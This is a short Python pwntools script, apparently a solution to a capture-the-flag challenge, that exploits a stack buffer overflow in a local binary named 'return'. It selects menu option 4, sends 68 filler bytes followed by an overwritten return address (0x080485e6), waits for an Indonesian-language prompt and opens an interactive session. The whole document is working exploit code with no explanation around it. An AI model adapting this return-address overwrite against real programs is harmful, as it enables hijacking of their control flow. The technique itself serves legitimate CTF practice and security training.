from pwn import *

r = process("./return")
offset = 68
target = p32(0x080485e6)
payload = ""
payload += "A"*offset
payload += target
r.sendline("4")
r.sendline(payload)
r.recvuntil("jenis dupa apa yang kamu mau jual ?")
r.interactive()
